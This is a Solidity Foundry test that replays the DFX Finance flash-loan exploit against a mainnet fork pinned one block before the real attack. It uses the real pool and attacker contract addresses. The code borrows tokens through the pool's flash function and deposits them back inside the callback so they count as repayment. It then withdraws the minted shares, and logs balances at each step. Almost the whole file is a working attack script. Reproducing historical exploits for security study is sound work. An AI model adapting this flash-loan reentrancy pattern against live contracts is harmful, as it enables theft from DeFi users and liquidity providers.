// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {IERC20} from "../../interfaces/IERC20.sol";
import {IUniswapV3Pair} from "../../utils/IUniswapV3Pair.sol";

interface IDFX {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;

    function deposit(uint256 _deposit, uint256 _deadline) external;
    function withdraw(uint256 _curvesToBurn, uint256 _deadline) external;
    function derivatives(uint256) external returns (address);
    function balanceOf(address _of) external returns (uint256);
    function viewDeposit(uint256 _deposit) external view returns (uint256, uint256[] memory);
    function approve(address _spender, uint256 _amount) external returns (bool);
}

contract Exploit_DFXFinance is TestHarness {
    IDFX internal dfx = IDFX(0x46161158b1947D9149E066d6d31AF1283b2d377C);
    IERC20 internal usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 internal xidr = IERC20(0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52);

    address internal attackerContract = 0x6cFa86a352339E766FF1cA119c8C40824f41F22D;

    uint256 internal constant AMOUNT_TO_DEPOSIT = 200_000_000_000_000_000_000_000;

    // The attacker contract has the possibility to request for foreign flashloans and also to perform the
    // attack with own tokens.
    // The first tx shown above uses a flashloan on Uniswap and then performs the attack with own tokens (to
    // save fees).
    // We are showing an attack once the attacker stole funds several times and starts with pre-existing
    // balance.
    function setUp() external {
        cheat.createSelectFork(vm.envString("RPC_URL"), 15941703); // We pin one block before the exploit
            // happened.

        // We simulate some balance in this contract
        writeTokenBalance(address(this), address(usdc), usdc.balanceOf(attackerContract));
        writeTokenBalance(address(this), address(xidr), xidr.balanceOf(attackerContract));
        cheat.deal(address(this), attackerContract.balance);

        require(
            xidr.balanceOf(attackerContract) == xidr.balanceOf(address(this)), "Failed to copy xidr balance"
        );
        require(
            usdc.balanceOf(attackerContract) == usdc.balanceOf(address(this)), "Failed to copy usdc balance"
        );

        xidr.approve(address(dfx), type(uint256).max);
        usdc.approve(address(dfx), type(uint256).max);
    }

    function test_attack() external {
        console.log("------- INITIAL BALANCES -------");
        console.log("DFX");
        logBalances(address(dfx));
        console.log("Attacker");
        logBalances(address(this));
        uint256 balanceBefore = address(this).balance;

        // Get the amount of USDC required for the attack.
        ( /* uint256 curvesInExchange */ , uint256[] memory amountPerToken) =
            dfx.viewDeposit(AMOUNT_TO_DEPOSIT);
        uint256 amount0 = amountPerToken[0] * 994 / 1000; // From tx trace
        uint256 amount1 = amountPerToken[1] * 994 / 1000; // From tx trace

        attack_dfx(amount0, amount1);
        uint256 balanceAfter = address(this).balance;
        assertGe(balanceAfter, balanceBefore);
    }

    function attack_dfx(uint256 amt0, uint256 amt1) internal {
        requestLoan(amt0, amt1); // We trigger the loan from here.

        // Because we do not need to pay it back as we are depositing (rekt) we can later withdraw
        // Burn the shares minted on deposit to claim the tokens back.
        dfx.withdraw(dfx.balanceOf(address(this)), 16_666_017_386_600);

        console.log("------- STEP IV: AFTER WITHDRAWING -------");
        console.log("Attacker Balance");
        logBalances(address(this));
        console.log("DFX Balance");
        logBalances(address(dfx));
    }

    function requestLoan(uint256 amt0, uint256 amt1) internal {
        console.log("------- STEP I: FLASHLOAN REQUESTED -------");
        dfx.flash(address(this), amt0, amt1, new bytes(0));
    }

    function flashCallback(uint256, /* _fee0 */ uint256, /* _fee1 */ bytes memory /* data */ ) external {
        require(msg.sender == address(dfx), "Only callable by DFX");

        console.log("------- STEP II: INSIDE DFX FLASHLOAN CALLBACK -------");
        console.log("Attacker Balance");
        logBalances(address(this));
        console.log("DFX Balance");
        logBalances(address(dfx));

        dfx.deposit(AMOUNT_TO_DEPOSIT, 16_666_017_386_600);
        console.log("------- STEP III: AFTER SIDE ENTRANCE (DEPOSIT) -------");
        console.log("Attacker Balance");
        logBalances(address(this));
        console.log("DFX Balance");
        logBalances(address(dfx));
    }

    function logBalances(address _from) internal {
        emit log_named_decimal_uint("NATIVE TOKENS", _from.balance, 18);
        emit log_named_decimal_uint("USDC", usdc.balanceOf(_from), 6);
        emit log_named_decimal_uint("XIDR", xidr.balanceOf(_from), 6);

        console.log("\n");
    }
}
